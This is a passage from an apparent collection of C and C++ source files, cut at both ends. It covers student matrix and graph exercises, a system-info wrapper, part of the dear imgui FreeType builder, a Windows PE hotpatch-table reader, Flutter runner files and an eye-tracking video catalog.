dinhU) {\n\tint soBacRa = 0;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tif (mtk.maTranKe[dinhU][i] != 0)\n\t\t\tsoBacRa++;\n\t}\n\treturn soBacRa;\n}\n\n// Cho \u0111\u1ec9nh u, t\u00ecm \u0111\u1ec9nh v sao cho c\u1ea1nh (u,v) c\u00f3 tr\u1ecdng s\u1ed1 l\u1edbn nh\u1ea5t \nbool canhLonNhat(maTrix mtk, int dinhU, int& dinhV) {\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tif (mtk.maTranKe[dinhU][i] > mtk.maTranKe[dinhU][dinhV])\n\t\t\tdinhV = i;\n\t}\n\treturn true;\n}\n\nint main() {\n\tmaTrix mtk;\n\treadFile(mtk);\n\toutputMaTrix(mtk);\n\n\treturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <string.h>\n#include <sys/utsname.h>\n\n\ntypedef struct _\u0441\u0438\u0441_\u0456\u043d\u0444 {\n    char *\u043d\u0430\u0437\u0432\u0430_\u0441\u0438\u0441\u0442\u0435\u043c\u0438;\n    char *\u043d\u0430\u0437\u0432\u0430_\u0432\u0443\u0437\u043b\u0430;\n    char *\u0437\u0431\u0456\u0440\u043a\u0430_\u044f\u0434\u0440\u0430;\n    char *\u0432\u0435\u0440\u0441\u0456\u044f;\n    char *\u0430\u0440\u0445\u0456\u0442\u0435\u043a\u0442\u0443\u0440\u0430;\n} \u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0430\u0406\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044f;\n\n\nextern \"C\" int \u043e\u0442\u0440\u0438\u043c\u0430\u0442\u0438_\u0441\u0438\u0441\u0442\u0435\u043c\u043d\u0443_\u0456\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044e(\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0430\u0406\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044f *\u0441\u0438\u0441_\u0456\u043d\u0444, int \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443) {\n    struct utsname buffer;\n\n    errno = 0;\n    if (uname(&buffer) < 0) {\n        perror(\"uname\");\n        exit(EXIT_FAILURE);\n    }\n\n    if (\u0441\u0438\u0441_\u0456\u043d\u0444 == nullptr) {\n        perror(\"\u0441\u0438\u0441_\u0456\u043d\u0444\");\n        exit(EXIT_FAILURE);\n    }\n\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u043d\u0430\u0437\u0432\u0430_\u0441\u0438\u0441\u0442\u0435\u043c\u0438, buffer.sysname, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u043d\u0430\u0437\u0432\u0430_\u0432\u0443\u0437\u043b\u0430, buffer.nodename, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u0437\u0431\u0456\u0440\u043a\u0430_\u044f\u0434\u0440\u0430, buffer.release, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u0432\u0435\u0440\u0441\u0456\u044f, buffer.version, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u0430\u0440\u0445\u0456\u0442\u0435\u043a\u0442\u0443\u0440\u0430, buffer.machine, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n\n    // printf(\"system name = %s\\n\", buffer.sysname);\n    // printf(\"node name   = %s\\n\", buffer.nodename);\n    // printf(\"release     = %s\\n\", buffer.release);\n    // printf(\"version     = %s\\n\", buffer.version);\n    // printf(\"machine     = %s\\n\", buffer.machine);\n\n    return EXIT_SUCCESS;\n}\n\nextern \"C\" void \u0434\u0440\u0443\u043a_\u0441\u0456(const char* \u0444\u043e\u0440\u043c\u0430\u0442, char* \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f = nullptr) {\n    printf(\u0444\u043e\u0440\u043c\u0430\u0442, \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f);\n}",
    "#include <iostream>\n\nusing namespace std;\n\nconst int righeMax=3;\nconst int colonneMax=3;\n\n//prototipi\nvoid caricaMatrice(int matrix[righeMax][colonneMax]);\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax]);\nvoid caricaVettori(int matrix[righeMax][colonneMax], int vr[righeMax*colonneMax], int vc[righeMax*colonneMax]);\nvoid visualizzaVettori(int vr[], int vc[]);\nint Menu();\n\nint main() {\n\n  int scelta;\n  int matrix[righeMax][colonneMax];\n  int VR[righeMax*colonneMax];\n  int VC[righeMax*colonneMax];\n  \n  do {\n    scelta=Menu();\n    switch(scelta) {\n      case 1:\n        caricaMatrice(matrix);\n      break;\n      case 2:\n        visualizzaMatrice(matrix);\n      break;\n      case 3:\n        caricaVettori(matrix,VR,VC);\n      break;\n      case 4:\n        visualizzaVettori(VR,VC);\n      break;\n      case 0:\n        cout<<\"Esci\"<<endl;\n      break;\n      default:\n        cout<<\"Attenzione, scelta sbagliata!\"<<endl;\n      break;\n    }\n  }while(scelta!=0);\n  \n}\n\n\nint Menu() {\n  int scegli;\n  cout<<\"-----------------MENU-----------------\"<<endl;\n  cout<<\"1-Carica matrice\"<<endl;\n  cout<<\"2-Visualizza matrice\"<<endl;\n  cout<<\"3-Carica vettori righe e colonne\"<<endl;\n  cout<<\"4-Stampa i vettori\"<<endl;\n  cout<<\"0-Fine\"<<endl;\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli;\n}\n\n\nvoid caricaMatrice(int matrix[righeMax][colonneMax]) {\n\n  cout<<endl;\n\n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      cout<<\"Inserisci il valore della cella \"<<i+1<<\" \"<<j+1<<\": \";\n      cin>>matrix[i][j];\n    }\n  }\n\n\n  cout<<endl;\n\n}\n\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax]) {\n\n  cout<<endl;\n\n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      cout<<matrix[i][j]<<\"\\t\";\n    }\n    cout<<endl;\n  }\n\n  cout<<endl;\n\n}\n\n\nvoid caricaVettori(int matrix[righeMax][colonneMax], int vr[], int vc[]) {\n  \n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      vr[i*colonneMax+j]=matrix[i][j];\n    }\n  }\n\n\n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      vc[i*colonneMax+j]=matrix[j][i];\n    }\n  }\n\n  \n}\n\n\nvoid visualizzaVettori(int vr[], int vc[]) {\n  cout<<endl;\n\n  cout<<endl;\n\n  cout<<\"---------------VETTORE RIGHE---------------\"<<endl;\n\n  for(int i=0; i<righeMax*colonneMax; i++) {\n     cout<<vr[i]<<endl;\n  }\n\n  cout<<endl;\n\n  cout<<\"---------------VETTORE COLONNE---------------\"<<endl;\n\n  for(int i=0; i<righeMax*colonneMax; i++) {\n    cout<<vc[i]<<endl;\n  }\n  \n}\n",
    "// dear imgui: FreeType font builder (used as a replacement for the stb_truetype builder)\n// (code)\n\n// Get the latest version at https://github.com/ocornut/imgui/tree/master/misc/freetype\n// Original code by @vuhdo (Aleksei Skriabin). Improvements by @mikesart. Maintained since 2019 by @ocornut.\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2023/08/01: added support for SVG fonts, enable by using '#define IMGUI_ENABLE_FREETYPE_LUNASVG' (#6591)\n//  2023/01/04: fixed a packing issue which in some occurrences would prevent large amount of glyphs from being packed correctly.\n//  2021/08/23: fixed crash when FT_Render_Glyph() fails to render a glyph and returns NULL.\n//  2021/03/05: added ImGuiFreeTypeBuilderFlags_Bitmap to load bitmap glyphs.\n//  2021/03/02: set 'atlas->TexPixelsUseColors = true' to help some backends with deciding of a prefered texture format.\n//  2021/01/28: added support for color-layered glyphs via ImGuiFreeTypeBuilderFlags_LoadColor (require Freetype 2.10+).\n//  2021/01/26: simplified integration by using '#define IMGUI_ENABLE_FREETYPE'. renamed ImGuiFreeType::XXX flags to ImGuiFreeTypeBuilderFlags_XXX for consistency with other API. removed ImGuiFreeType::BuildFontAtlas().\n//  2020/06/04: fix for rare case where FT_Get_Char_Index() succeed but FT_Load_Glyph() fails.\n//  2019/02/09: added RasterizerFlags::Monochrome flag to disable font anti-aliasing (combine with ::MonoHinting for best results!)\n//  2019/01/15: added support for imgui allocators + added FreeType only override function SetAllocatorFunctions().\n//  2019/01/10: re-factored to match big update in STB builder. fixed texture height waste. fixed redundant glyphs when merging. support for glyph padding.\n//  2018/06/08: added support for ImFontConfig::GlyphMinAdvanceX, GlyphMaxAdvanceX.\n//  2018/02/04: moved to main imgui repository (away from http://www.github.com/ocornut/imgui_club)\n//  2018/01/22: fix for addition of ImFontAtlas::TexUvscale member.\n//  2017/10/22: minor inconsequential change to match change in master (removed an unnecessary statement).\n//  2017/09/26: fixes for imgui internal changes.\n//  2017/08/26: cleanup, optimizations, support for ImFontConfig::RasterizerFlags, ImFontConfig::RasterizerMultiply.\n//  2017/08/16: imported from https://github.com/Vuhdo/imgui_freetype into http://www.github.com/ocornut/imgui_club, updated for latest changes in ImFontAtlas, minor tweaks.\n\n// About Gamma Correct Blending:\n// - FreeType assumes blending in linear space rather than gamma space.\n// - See https://www.freetype.org/freetype2/docs/reference/ft2-base_interface.html#FT_Render_Glyph\n// - For correct results you need to be using sRGB and convert to linear space in the pixel shader output.\n// - The default dear imgui styles will be impacted by this change (alpha values will need tweaking).\n\n// FIXME: cfg.OversampleH, OversampleV are not supported (but perhaps not so necessary with this rasterizer).\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_freetype.h\"\n#include \"imgui_internal.h\"     // ImMin,ImMax,ImFontAtlasBuild*,\n#include <stdint.h>\n\n#include <ft2build.h>\n#include FT_FREETYPE_H          // <freetype/freetype.h>\n#include FT_MODULE_H            // <freetype/ftmodapi.h>\n#include FT_GLYPH_H             // <freetype/ftglyph.h>\n#include FT_SYNTHESIS_H         // <freetype/ftsynth.h>\n\n#ifdef IMGUI_ENABLE_FREETYPE_LUNASVG\n#include FT_OTSVG_H             // <freetype/otsvg.h>\n#include FT_BBOX_H              // <freetype/ftbbox.h>\n#include <lunasvg.h>\n#if !((FREETYPE_MAJOR >= 2) && (FREETYPE_MINOR >= 12))\n#error IMGUI_ENABLE_FREETYPE_LUNASVG requires FreeType version >= 2.12\n#endif\n#endif\n\n#ifdef _MSC_VER\n#pragma warning (push)\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n#ifdef __GNUC__\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wsubobject-linkage\"        // warning: 'xxxx' has a field 'xxxx' whose type uses the anonymous namespace\n#endif\n\n//-------------------------------------------------------------------------\n// Data\n//-------------------------------------------------------------------------\n\n// Default memory allocators\nstatic void* ImGuiFreeTypeDefaultAllocFunc(size_t size, void* user_data) { IM_UNUSED(user_data); return IM_ALLOC(size); }\nstatic void  ImGuiFreeTypeDefaultFreeFunc(void* ptr, void* user_data) { IM_UNUSED(user_data); IM_FREE(ptr); }\n\n// Current memory allocators\nstatic void* (*GImGuiFreeTypeAllocFunc)(size_t size, void* user_data) = ImGuiFreeTypeDefaultAllocFunc;\nstatic void  (*GImGuiFreeTypeFreeFunc)(void* ptr, void* ",
    "#define  _CRT_SECURE_NO_WARNINGS\r\n\r\n#include <Windows.h>\r\n#include <imagehlp.h>\r\n#include <stdio.h>\r\nBOOL our_GetImageConfigInformation(\r\n\tPLOADED_IMAGE                LoadedImage,\r\n\tPIMAGE_LOAD_CONFIG_DIRECTORY ImageConfigInformation\r\n)\r\n{\r\n\tif (!LoadedImage || !ImageConfigInformation)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_PARAMETER);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadedImage->FileHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_PARAMETER);\r\n\t\treturn FALSE;\r\n\t}\r\n\tULONG LoadConfigDirectorySize;\r\n\tPIMAGE_LOAD_CONFIG_DIRECTORY LoadConfigDirectoryAddress\r\n\t\t= (PIMAGE_LOAD_CONFIG_DIRECTORY)ImageDirectoryEntryToDataEx(\r\n\t\t\tLoadedImage->MappedAddress,\r\n\t\t\tFALSE,\r\n\t\t\tIMAGE_DIRECTORY_ENTRY_LOAD_CONFIG,\r\n\t\t\t&LoadConfigDirectorySize,\r\n\t\t\tNULL\r\n\t\t);\r\n\tif (!LoadConfigDirectoryAddress)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadConfigDirectorySize != sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadConfigDirectoryAddress->Size > 0 && LoadConfigDirectoryAddress->Size < sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tsize_t hotpatch_offset = 0;\r\n\thotpatch_offset = (size_t)&LoadConfigDirectoryAddress->HotPatchTableOffset - (size_t)LoadedImage->MappedAddress;\r\n\tprintf(\"Hotpatch File Offset: %d\\n\", hotpatch_offset);\r\n\r\n\tmemcpy(ImageConfigInformation, LoadConfigDirectoryAddress, sizeof(IMAGE_LOAD_CONFIG_DIRECTORY));\r\n\treturn TRUE;\r\n}\r\nsize_t determine_patch_table_offset(PLOADED_IMAGE img, PIMAGE_LOAD_CONFIG_DIRECTORY dic) {\r\n\tfor (int i = 0; i < img->NumberOfSections; i++) {\r\n\t\tif (dic->HotPatchTableOffset > img->Sections[i].VirtualAddress && dic->HotPatchTableOffset < (img->Sections[i].VirtualAddress + img->Sections[i].SizeOfRawData)) {\r\n\r\n\t\t\tsize_t result =  img->Sections[i].PointerToRawData + (dic->HotPatchTableOffset - img->Sections[i].VirtualAddress);\r\n\t\t\treturn result;\r\n\t\t}\r\n\r\n\t}\r\n\treturn 0;\r\n}\r\nint main() {\r\n\t//const char* img_path = \"C:\\\\NtHotpatch\\\\dist\\\\kernelbase_patch_mod.dll\";\r\n\tconst char* img_path = \"C:\\\\NtHotpatch\\\\dist\\\\UpdatedDLL.dll\";\r\n\tPLOADED_IMAGE img;\r\n\r\n\tIMAGE_LOAD_CONFIG_DIRECTORY dic;\r\n\tZeroMemory(&dic, sizeof(dic));\r\n\tdic.Size = sizeof(dic);\r\n\r\n#if 1\r\n\tstatic LOADED_IMAGE ref_img;\r\n\tif (!MapAndLoad(img_path, NULL, &ref_img, TRUE, TRUE)) {\r\n\t\tprintf(\"failed to map and load img - %08x\\n\", GetLastError());\r\n\t\treturn 0;\r\n\t}\r\n\telse {\r\n\t\timg = &ref_img;\r\n\t}\r\n#else\r\n\timg = ImageLoad(img_path, NULL);\r\n\tif (!img) {\r\n\t\tprintf(\"failed to load img - %08x\\n\", GetLastError());\r\n\t\treturn 0;\r\n\t}\r\n#endif\r\n\r\n\tif (!our_GetImageConfigInformation(img, &dic)) {\r\n\t\tprintf(\"Failed to get img config info - %08x\\n\", GetLastError());\r\n\t} \r\n\telse {\r\n\t\tprintf(\"Hotpatch: %d\\n\", dic.HotPatchTableOffset);\r\n\t\t/*if (!ImageUnload(img)) {\r\n\t\t\tprintf(\"Failed to unload img\\n\");\r\n\t\t\treturn 0;\r\n\t\t}*/\r\n\t\tFILE* fd = fopen(img_path, \"rb\");\r\n\r\n\t\tint patch_info_offset = determine_patch_table_offset(img, &dic);\r\n\t\tfseek(fd, patch_info_offset, SEEK_SET);\r\n\r\n\t\tIMAGE_HOT_PATCH_INFO info;\r\n\t\tZeroMemory(&info, sizeof(info));\r\n\t\tfread(&info, sizeof(IMAGE_HOT_PATCH_INFO), 1, fd);\r\n\t\t\r\n\t\tprintf(\"IMAGE_HOT_PATCH_INFO - size %d: \\n\", sizeof(IMAGE_HOT_PATCH_INFO));\r\n\t\tprintf(\"\\tVersion: %d\\n\", info.Version);\r\n\t\tprintf(\"\\tSize: %d\\n\", info.Size);\r\n\t\tprintf(\"\\tSequenceNumber: %d\\n\", info.SequenceNumber);\r\n\t\tprintf(\"\\tBaseImageList: %d\\n\", info.BaseImageList);\r\n\t\tprintf(\"\\tBaseImageCount: %d\\n\", info.BaseImageCount);\r\n\t\tif (info.Version >= 2) {\r\n\t\t\tprintf(\"\\tBufferOffset: %d\\n\", info.BufferOffset);\r\n\t\t\tif (info.Version >= 3) {\r\n\t\t\t\tprintf(\"\\tExtraPatchSize: %d\\n\", info.ExtraPatchSize);\r\n\t\t\t}\r\n\t\t}\r\n\t\telse {\r\n\t\t\tprintf(\"unsupported patch info version\\n\");\r\n\t\t\treturn 0;\r\n\t\t}\r\n\r\n\t\tfseek(fd, patch_info_offset + info.BaseImageList, SEEK_SET);\r\n\t\twhile ((ftell(fd) & 4)) { //force 32 bit alignment\r\n\t\t\tuint8_t x;\r\n\t\t\tfread(&x, 1, 1, fd);\r\n\t\t\tprintf(\"align... %02x\\n\", x);\r\n\t\t\t\r\n\t\t}\r\n\t\tfor (int i = 0; i < info.BaseImageCount; i++) {\r\n\t\t\tIMAGE_HOT_PATCH_BASE base;\r\n\t\t\tfread(&base, sizeof(IMAGE_HOT_PATCH_BASE), 1, fd);\r\n\t\t\tprintf(\"IMAGE_HOT_PATCH_BASE - size: %d\\n\", sizeof(IMAGE_HOT_PATCH_BASE));\r\n\t\t\tprintf(\"\\tSequenceNumber: %d\\n\", base.SequenceNumber);\r\n\t\t\tprintf(\"\\tFlags: %d\\n\", base.Flags);\r\n\t\t\tprintf(\"\\tOriginalTimeDateStamp: %d\\n\", base.OriginalTimeDateStamp);\r\n\t\t\tprintf(\"\\tOriginalCheckSum: %d\\n\", base.OriginalCheckSum);\r\n\t\t\tprintf(\"\\tCodeIntegrityInfo: %d\\n\", base.CodeIntegrityInfo);\r\n\t\t\tprintf(\"\\tCodeIntegritySize: %d\\n\", base.CodeIntegritySize);\r\n\t\t\tprintf(\"\\tPatchTable: %d\\n\", base.PatchTable);\r\n\t\t\tprintf(\"\\tBufferOffset: %d\\n\", base.BufferOffset);\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\t\r\n\r\n\t\tfclose(fd);\r\n\t}\r\n\r\n\treturn 0;\r\n}",
    "#include \"globals.h\"\n\n// globals\nstring file;\nstring dirClient;\nstring user;\nstring command;\nstring hostIp;\nstring port;\n\nbool parse_args(int argc, char *argv[]) {\n    po::options_description desc(\"Allowed options\");\n\n    desc.add_options()\n            (\"help,h\", \"print usage message\")\n            (\"ip, ip\", po::value(&hostIp), \"IP addres\")\n            (\"port,p\", po::value(&port), \"port\")\n            (\"dir,d\", po::value(&dirClient), \"the path to the folder where the files are saved\")\n            (\"command,c\", po::value(&command), \"command\")\n            (\"username,u\", po::value(&user),\"username\")\n            (\"file,f\", po::value(&file), \"file\");\n\n    // Parse argc and argv\n    po::variables_map vm;\n    store(po::parse_command_line(argc, argv, desc), vm);\n\n    if (vm.count(\"help\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    if (!vm.count(\"port\")) {\n        cout << desc << endl;\n        return false;\n    }\n    port = vm[\"port\"].as<string>();\n\n\n    user = vm[\"username\"].as<string>();\n    if (!vm.count(\"username\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    command = vm[\"command\"].as<string>();\n    if (!vm.count(\"command\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    file = vm[\"file\"].as<string>();\n    if (!vm.count(\"file\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    dirClient= vm[\"dir\"].as<string>();\n    if (!vm.count(\"dir\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    hostIp = vm[\"ip\"].as<string>();\n    if (!vm.count(\"ip\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    return true;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"proyekmobile\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Catalog.h\"\n\n#include <string>\n#include <algorithm>\n#include <iostream>\n#include <boost/filesystem.hpp>\n\n#include \"MatPersistor.h\"\n#include \"KeyPointPersistor.h\"\n#include \"VecKeyPointPersistor.h\"\n\nCatalog::Catalog(const std::vector<std::string>& videos,\n                 const std::vector<std::string>& gazes,\n                 const std::vector<uint64_t>& timestamps,\n                 const std::string& vocabularyPath,\n                 double tracker_rate) \n    : videoPaths(videos), gazes(gazes), timestamps(timestamps), vocabulary(vocabularyPath), tracker_rate(tracker_rate) {\n\n    if (!boost::filesystem::exists(vocabulary))\n        boost::filesystem::create_directory(vocabulary);\n\n    for (const auto& filename : videos) {\n        boost::filesystem::path path(filename);\n        boost::filesystem::path output(vocabulary + \"/\" + path.stem().string());\n\n        videoNames.push_back(path.stem().string());\n        videoStorage.push_back(output.string());\n    }\n}\n\nvoid Catalog::convert() {\n    const size_t max = 84 * 14000;\n\n    size_t counter = 0;\n    for (size_t i = 0; i < videoStorage.size(); ++i) {\n        std::vector<std::pair<std::vector<cv::KeyPoint>, uint32_t>> keypoints;\n\n        boost::filesystem::path path(videoStorage[i]); \n        boost::filesystem::directory_iterator end;\n        for (boost::filesystem::directory_iterator it(path); it != end; ++it) {\n            if (boost::filesystem::is_regular_file(it->path()) && it->path().extension().string() == \".key\") {\n                if (counter++ % 1024 == 0)\n                    std::cout << \"\\rKeypoint: \" << counter << \"/\" << max << std::flush;\n\n                uint32_t frame = std::stoi(it->path().filename().string());\n                std::vector<cv::KeyPoint> kp;\n                KeyPointPersistor::restore(it->path().string(), kp);\n                keypoints.emplace_back(kp, frame);\n            }\n        }\n\n        std::sort(keypoints.begin(), keypoints.end(), [](const auto& a, const auto& b) {\n            return a.second < b.second;\n        });\n\n        VecKeyPointPersistor::create(videoStorage[i] + \".key\", keypoints);\n    }\n}\n\nvoid Catalog::prefetch(bool openKeypoints, bool openGaze, bool in_memory, std::function<GazePoint(const GazePoint&)> converter) {\n    persistors.resize(videoStorage.size());\n    gazePersistors.resize(gazes.size());\n    keypointPersistors.resize(videoStorage.size());\n\n    std::vector<VideoIndex> indices;\n    for (size_t i = 0; i < videoStorage.size(); ++i) {\n        if (!persistors[i].isOpen())\n            persistors[i] = VecMatPersistor::open(videoStorage[i] + \".vid\", in_memory);\n        if(openKeypoints && !keypointPersistors[i].isOpen())\n            keypointPersistors[i] = VecKeyPointPersistor::open(videoStorage[i] + \".key\", in_memory);\n        if(openGaze && !gazePersistors[i].isOpen())\n            gazePersistors[i] = std::move(GazePointPersistor::open(gazes[i], timestamps[i], tracker_rate, converter));\n    }\n}\n\nvoid Catalog::unload() {\n    for (size_t i = 0; i < videoStorage.size(); ++i) {\n        if (persistors[i].isOpen())\n            persistors[i].close();\n        if (gazePersistors[i].isOpen())\n            gazePersistors[i].close();\n        if (keypointPersistors[i].isOpen())\n            keypointPersistors[i].close();\n    }\n}\n\nstd::vector<GazePoint> Catalog::getGaze(const VideoIndex& index) {\n    return gazePersistors[index.video][index.frame];\n}\n\nstd::vector<VideoIndex> Catalog::constructDescriptors(size_t subsample, bool in_memory) {\n    prefetch(false, false, in_memory);\n\n    std::vector<VideoIndex> indices;\n    for (size_t i = 0; i < videoStorage.size(); ++i) {\n        const auto frames = persistors[i].getDescriptorInfo();\n        for (size_t k = 0; k < frames.size(); k += subsample) {\n            const auto& frame = frames[k];\n            for (size_t j = 0; j < frame.count; ++j) {\n                indices.push_back(\n                    VideoIndex(static_cast<uint16_t>(i), frame.frame, static_cast<uint16_t>(j))\n                );\n            }\n        }\n    }\n\n    std::sort(indices.begin(), indices.end());\n    return indices;\n}\n\nstd::vector<VideoIndex> Catalog::constructImageDescriptors() {\n    prefetch();\n\n    std::vector<VideoIndex> indices;\n    for (size_t i = 0; i < 